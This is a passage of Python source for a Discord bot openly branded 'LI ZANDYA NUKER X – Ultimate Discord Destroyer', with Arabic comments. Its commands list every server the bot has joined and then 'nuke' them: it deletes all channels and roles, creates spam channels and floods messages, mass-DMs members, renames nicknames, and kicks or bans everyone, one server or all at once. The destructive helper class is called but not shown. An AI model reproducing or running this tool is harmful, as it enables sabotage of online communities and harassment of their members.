    
    await bot.process_commands(message)

# ============================================
# COMMANDS
# ============================================

@bot.command(name='servers')
async def servers_cmd(ctx):
    """!servers - عرض جميع السيرفرات التي فيها البوت مع أرقام"""
    if ctx.author.id != OWNER_ID:
        await ctx.send("❌ ACCESS DENIED!")
        return
    
    if not bot.guilds:
        await ctx.send("❌ No servers found!")
        return
    
    server_list = []
    for i, guild in enumerate(bot.guilds, 1):
        server_list.append(f"{i}. {guild.name} | Members: {guild.member_count}")
    
    chunks = [server_list[i:i+20] for i in range(0, len(server_list), 20)]
    
    for chunk in chunks:
        embed = discord.Embed(
            title="📡 LI ZANDYA - SERVERS LIST 📡",
            description=f"```yaml\n" + "\n".join(chunk) + "\n```",
            color=0x00FF00
        )
        embed.set_footer(text="Use !nuke-server <number> to destroy a server")
        await ctx.send(embed=embed)

@bot.command(name='nuke-server')
async def nuke_server_cmd(ctx, number: int = None):
    """!nuke-server <رقم> - تدمير سيرفر معين حسب رقمه"""
    if ctx.author.id != OWNER_ID:
        await ctx.send("❌ ACCESS DENIED!")
        return
    
    if number is None:
        await ctx.send("❌ Usage: `!nuke-server <number>`\nUse `!servers` to see server numbers!")
        return
    
    if number < 1 or number > len(bot.guilds):
        await ctx.send(f"❌ Invalid number! Please choose between 1 and {len(bot.guilds)}")
        return
    
    guild = bot.guilds[number - 1]
    
    embed = discord.Embed(
        title=f"💀 DESTROYING: {guild.name} 💀",
        description=f"```yaml\nTarget: {guild.name}\nMembers: {guild.member_count}\nStatus: OBLITERATING...\n```",
        color=0xFF0000
    )
    await ctx.send(embed=embed)
    
    results = await nuker.ultimate_nuke(guild)
    
    embed = discord.Embed(
        title="💀 SERVER DESTROYED! 💀",
        description=f"""```yaml
Target: {guild.name}
DM Sent: {results['dm_sent']:,}
Channels Deleted: {results['channels_deleted']}
Roles Deleted: {results['roles_deleted']}
Spam Messages: {results['spam_messages']}
Status: COMPLETELY ANNIHILATED
```""",
        color=0x00FF00
    )
    await ctx.send(embed=embed)

@bot.command(name='nuke')
async def nuke_cmd(ctx):
    """!nuke - تدمير السيرفر الحالي بالكامل"""
    if ctx.author.id != OWNER_ID:
        await ctx.send("❌ ACCESS DENIED!")
        return
    
    embed = discord.Embed(
        title="💀☢️ NUKE LAUNCHED! ☢️💀",
        description=f"```yaml\nTarget: {ctx.guild.name}\nMembers: {ctx.guild.member_count}\nStatus: DESTROYING...\n```",
        color=0xFF0000
    )
    await ctx.send(embed=embed)
    
    results = await nuker.ultimate_nuke(ctx.guild)
    
    embed = discord.Embed(
        title="💀 SERVER COMPLETELY DESTROYED! 💀",
        description=f"""```yaml
Target: {ctx.guild.name}
DM Sent: {results['dm_sent']:,}
Channels Deleted: {results['channels_deleted']}
Roles Deleted: {results['roles_deleted']}
Spam Messages: {results['spam_messages']}
Status: ERASED FROM EXISTENCE
```""",
        color=0x00FF00
    )
    await ctx.send(embed=embed)

@bot.command(name='nuke-all')
async def nuke_all_cmd(ctx):
    """!nuke-all - تدمير جميع السيرفرات"""
    if ctx.author.id != OWNER_ID:
        await ctx.send("❌ ACCESS DENIED!")
        return
    
    embed = discord.Embed(
        title="💀☢️ GLOBAL NUKE LAUNCHED! ☢️💀",
        description=f"```yaml\nTotal Servers: {len(bot.guilds)}\nTotal Members: {sum(g.member_count for g in bot.guilds):,}\nStatus: DESTROYING ALL...\n```",
        color=0xFF0000
    )
    await ctx.send(embed=embed)
    
    total_dm = 0
    total_channels = 0
    total_roles = 0
    servers_nuked = 0
    
    for guild in bot.guilds:
        try:
            results = await nuker.ultimate_nuke(guild)
            total_dm += results['dm_sent']
            total_channels += results['channels_deleted']
            total_roles += results['roles_deleted']
            servers_nuked += 1
        except:
            pass
    
    embed = discord.Embed(
        title="💀 GLOBAL NUKE COMPLETE! 💀",
        description=f"""```yaml
Servers Destroyed: {servers_nuked}
Total DM Sent: {total_dm:,}
Total Channels Deleted: {total_channels:,}
Total Roles Deleted: {total_roles:,}
Status: ALL SERVERS DESTROYED
```""",
        color=0x00FF00
    )
    await ctx.send(embed=embed)

@bot.command(name='dm-all')
async def dm_all_cmd(ctx):
    """!dm-all - إرسال رسائل لجميع الأعضاء"""
    if ctx.author.id != OWNER_ID:
        await ctx.send("❌ ACCESS DENIED!")
        return
    
    embed = discord.Embed(
        title="📨 MASS DM INITIATED! 📨",
        description=f"```yaml\nTarget: {ctx.guild.name}\nMembers: {ctx.guild.member_count}\nStatus: SENDING...\n```",
        color=0xFF6600
    )
    await ctx.send(embed=embed)
    
    sent, failed = await nuker.mass_dm_everyone(bot, ctx.guild)
    
    embed = discord.Embed(
        title="✅ MASS DM COMPLETE! ✅",
        description=f"```yaml\nDM Sent: {sent:,}\nDM Failed: {failed}\nStatus: ALL MEMBERS DM'ED\n```",
        color=0x00FF00
    )
    await ctx.send(embed=embed)

@bot.command(name='kill')
async def kill_cmd(ctx):
    """!kill - حذف جميع القنوات والرتب"""
    if ctx.author.id != OWNER_ID:
        await ctx.send("❌ ACCESS DENIED!")
        return
    
    channels = await nuker.delete_all_channels(ctx.guild)
    roles = await nuker.delete_all_roles(ctx.guild)
    
    await ctx.send(f"✅ **DELETED:** {channels} channels, {roles} roles")

@bot.command(name='spam')
async def spam_cmd(ctx):
    """!spam - إنشاء قنوات سبام وسبام"""
    if ctx.author.id != OWNER_ID:
        await ctx.send("❌ ACCESS DENIED!")
        return
    
    channels = await nuker.create_spam_channels(ctx.guild, 100)
    messages = await nuker.spam_all_channels(ctx.guild, 50)
    
    await ctx.send(f"✅ **SPAM COMPLETE:** {len(channels)} channels created, {messages} messages sent")

@bot.command(name='rename')
async def rename_cmd(ctx):
    """!rename - تغيير اسم السيرفر"""
    if ctx.author.id != OWNER_ID:
        await ctx.send("❌ ACCESS DENIED!")
        return
    
    await nuker.rename_server(ctx.guild)
    await ctx.send("✅ **SERVER RENAMED!**")

@bot.command(name='nick-all')
async def nick_all_cmd(ctx):
    """!nick-all - تغيير أسماء جميع الأعضاء"""
    if ctx.author.id != OWNER_ID:
        await ctx.send("❌ ACCESS DENIED!")
        return
    
    count = await nuker.change_all_nicknames(ctx.guild)
    await ctx.send(f"✅ **NICKNAMES CHANGED:** {count} members")

@bot.command(name='kick-all')
async def kick_all_cmd(ctx):
    """!kick-all - طرد جميع الأعضاء"""
    if ctx.author.id != OWNER_ID:
        await ctx.send("❌ ACCESS DENIED!")
        return
    
    count = await nuker.kick_all(ctx.guild)
    await ctx.send(f"✅ **KICKED:** {count} members")

@bot.command(name='ban-all')
async def ban_all_cmd(ctx):
    """!ban-all - حظر جميع الأعضاء"""
    if ctx.author.id != OWNER_ID:
        await ctx.send("❌ ACCESS DENIED!")
        return
    
    count = await nuker.ban_all(ctx.guild)
    await ctx.send(f"✅ **BANNED:** {count} members")

@bot.command(name='stats')
async def stats_cmd(ctx):
    """!stats - عرض الإحصائيات"""
    if ctx.author.id != OWNER_ID:
        await ctx.send("❌ ACCESS DENIED!")
        return
    
    elapsed = time.time() - nuker.start_time if nuker.start_time else 0
    hours = int(elapsed // 3600)
    minutes = int((elapsed % 3600) // 60)
    
    embed = discord.Embed(
        title="💀 LI ZANDYA NUKER - STATISTICS 💀",
        description=f"""```yaml
╔══════════════════════════════════════════════════════════╗
║                    DESTRUCTION STATS                     ║
╠══════════════════════════════════════════════════════════╣
║  🎯 SERVERS DESTROYED: {len(nuker.nuked_servers)}
║  📨 TOTAL DM SENT: {nuker.total_dm_sent:,}
║  🗑️ CHANNELS DELETED: {nuker.total_channels_deleted:,}
║  👑 ROLES DELETED: {nuker.total_roles_deleted:,}
║  💬 SPAM MESSAGES: {nuker.total_spam_sent:,}
║  ⏱️ UPTIME: {hours}h {minutes}m
╠══════════════════════════════════════════════════════════╣
║  💀 LI ZANDYA MAFIA - ABSOLUTE POWER 💀
╚══════════════════════════════════════════════════════════╝
```""",
        color=0x00FF00
    )
    await ctx.send(embed=embed)

@bot.command(name='help')
async def help_cmd(ctx):
    """!help - عرض المساعدة"""
    embed = discord.Embed(
        title="💀 LI ZANDYA NUKER - HELP 💀",
        description=f"""```yaml
╔══════════════════════════════════════════════════════════════════════╗
║                          NUKE COMMANDS                               ║
╠══════════════════════════════════════════════════════════════════════╣
║  💀 !servers      - SHOW ALL SERVERS WITH NUMBERS                    ║
║  💀 !nuke-server  - DESTROY SERVER BY NUMBER                         ║
║  💀 !nuke         - DESTROY CURRENT SERVER                           ║
║  💀 !nuke-all     - DESTROY ALL SERVERS                              ║
║  💀 !dm-all       - MASS DM ALL MEMBERS                              ║
║  💀 !kill         - DELETE ALL CHANNELS & ROLES                      ║
║  💀 !spam         - CREATE SPAM CHANNELS & MESSAGES                  ║
║  💀 !rename       - CHANGE SERVER NAME                               ║
║  💀 !nick-all     - CHANGE ALL NICKNAMES                             ║
║  💀 !kick-all     - KICK ALL MEMBERS                                 ║
║  💀 !ban-all      - BAN ALL MEMBERS                                  ║
║  💀 !stats        - SHOW STATISTICS                                  ║
║  💀 !help         - SHOW THIS HELP                                   ║
╠══════════════════════════════════════════════════════════════════════╣
║  💀 FIRST USER = MASTER OWNER 💀                                     ║
║  🐉 LI ZANDYA MAFIA - TOTAL DESTRUCTION 🐉                           ║
╚══════════════════════════════════════════════════════════════════════╝
```""",
        color=0x00FF00
    )
    await ctx.send(embed=embed)

# ============================================
# RUN
# ============================================

if __name__ == "__main__":
    print("""
    ╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
    ║                                                                                                                                          ║
    ║     💀 LI ZANDYA NUKER X - ULTIMATE DISCORD DESTROYER 💀                                                                                 ║
    ║                                                                                                                                          ║
    ║  ╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗  ║
    ║  ║                                                                                                                                  ║  ║
    ║  ║  🔥 FEATURES:                                                                                                                    ║  ║
    ║  ║  • MASS DM ALL MEMBERS - يباني جميع الأعضاء في ثواني                                                                             ║  ║
    ║  ║  • DELETE ALL CHANNELS & ROLES - حذف كل شيء                                                                                      ║  ║
    ║  ║  • CREATE SPAM CHANNELS - إنشاء 100+ قناة سبام                                                                                   ║  ║
    ║  ║  • MASS SPAM - سبام في جميع القنوات                                                                                              ║  ║
    ║  ║  • CHANGE ALL NICKNAMES - تغيير أسماء الجميع                                                                                     ║  ║
    ║  ║  • MASS KICK/BAN - طرد أو حظر الجميع                                                                                             ║  ║
    ║  ║  • !servers - يعرض كل السيرفرات بأرقام                                                                                          ║  ║
    ║  ║  • !nuke-server <number> - تدمير سيرفر معين بالرقم                                                                              ║  ║
    ║  ║                                                                                                                                  ║  ║
    ║  ║  💀 FIRST USER = MASTER OWNER - يتحكم في كل شيء 💀                                                                               ║  ║
    ║  ║  🐉 LI ZANDYA MAFIA - ABSOLUTE DESTRUCTION 🐉                                                                                    ║  ║
    ║  ║                                                                                                                                  ║  ║
    ║  ╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝  ║
    ║                                                                                                                                          ║
    ║  🔑 ENTER YOUR BOT TOKEN TO START THE NUKE! 🔑                                                                                           ║
    ║                                                                                                                                          ║
    ╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
    """)
    
    TOKEN = input("\n🔑 Enter Discord Bot Token: ").strip()
    if not TOKEN:
        print("❌ No token!")
        sys.exit(1)
    
    print("\n✅ LI ZANDYA NUKER X ACTIVATED!\n")
    print("💀 FIRST USER TO SEND A MESSAGE = MASTER OWNER 💀\n")
    print("📡 USE !servers TO SEE ALL SERVERS WITH NUMBERS 📡\n")
    print("⚡ USE !nuke-server <number> TO DESTROY A SPECIFIC SERVER ⚡\n")
    
    bot.run(TOKEN)
